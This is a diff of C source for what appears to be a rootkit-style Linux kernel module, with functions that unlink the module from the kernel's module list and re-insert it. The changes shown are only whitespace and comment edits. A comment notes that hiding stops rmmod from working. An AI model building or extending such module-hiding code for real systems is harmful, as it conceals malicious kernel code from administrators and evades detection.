@@ -4,8 +4,7 @@
 static struct module	*me;
 static struct mutex		*_module_mutex;
 static struct list_head *mod_lst;
-static	char	hidden	= 0;
-
+static char	hidden	= 0;
 
 void hidemod_setmutex(unsigned long mutex_addr)
 {
@@ -13,18 +12,15 @@ void hidemod_setmutex(unsigned long mutex_addr)
 	printk("Address of module_mutex: %p\n", _module_mutex);
 }
 
-
 /**
- * we should enable this hide multiple modules.
- * by having a list of pairs (module, name)
+ * we should enable this to hide multiple modules
+ * by having a list of pairs (module, name).
  */
 void hidemod_setmodule(struct module *to_hide)
 {
 	me = to_hide;
 	mod_lst = to_hide->list.next;
 }
-
-
 
 // Removes this module from the kernel modules list. rmmod would stop working for this module.
 void hide_module(void)
@@ -38,6 +34,7 @@ void hide_module(void)
 	mutex_unlock(_module_mutex);
 }
 
+// Re-inserts this module in the list.
 void show_module(void)
 {
 	if(!hidden)
